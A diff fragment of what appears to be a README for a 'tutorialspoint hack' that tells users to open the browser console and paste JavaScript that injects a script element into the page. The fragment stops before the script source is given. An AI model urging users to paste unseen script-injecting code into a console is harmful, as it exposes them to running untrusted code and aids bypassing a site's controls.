@@ -12,6 +12,7 @@ Usage steps for tutorialspoint hack
     
 2.  Open console in Firefox or Chrome (Ctr+Shift+i)
 3.  Paste below lines to console where the curson is blikning
+
     Recommended
     <pre>
     var s=document.createElement('script');s.type='text/javascript';
